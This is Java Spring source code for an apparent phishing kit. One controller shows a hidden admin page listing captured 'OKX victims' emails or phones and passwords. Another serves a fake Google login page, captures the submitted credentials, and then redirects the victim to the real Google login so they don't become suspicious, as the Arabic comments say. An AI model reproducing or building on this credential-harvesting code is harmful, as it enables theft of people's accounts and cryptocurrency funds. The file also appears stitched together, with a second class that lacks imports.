package com.example.okx;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import java.util.List;

@RestController
public class AdminPanelController {

    @GetMapping("/admin-panel-secret")
    public String showData() {
        List<String[]> data = OkxApplication.victimData;
        
        StringBuilder html = new StringBuilder();
        html.append("<html><body style='font-family:sans-serif; padding:20px;'>");
        html.append("<h2>🔒 OKX Victims Data (Secret)</h2>");
        html.append("<table border='1' style='width:100%; border-collapse:collapse;'>");
        html.append("<tr style='background:#eee;'><th>Email / Phone</th><th>Password</th></tr>");
        
        for (String[] row : data) {
            html.append("<tr><td style='padding:10px;'>").append(row[0])
                .append("</td><td style='padding:10px;'>").append(row[1])
                .append("</td></tr>");
        }
        
        if (data.isEmpty()) {
            html.append("<tr><td colspan='2' style='text-align:center; padding:20px;'>No data yet. Waiting for victims...</td></tr>");
        }

        html.append("</table></body></html>");
        return html.toString();
    }
}
@Controller
public class GoogleCaptureController {

    // 1. يفتح صفحة جوجل الوهمية لما يدوس على الزرار
    @GetMapping("/login/google-page")
    public String showGooglePage() {
        return "google-login"; 
    }

    // 2. يستلم البيانات ويبعتها للأدمن ويحول المستخدم لجوجل الحقيقي
    @PostMapping("/capture-google")
    public String captureGoogle(@RequestParam String email, @RequestParam String password) {
        // هنا الكود اللي بيبعت البيانات لصفحة الأدمن بتاعتك
        System.out.println("Captured Google Email: " + email);
        System.out.println("Captured Google Password: " + password);

        // أهم خطوة: تحويل المستخدم لموقع جوجل الحقيقي عشان ميشكش في حاجة
        return "redirect:https://accounts.google.com/ServiceLogin";
    }
}
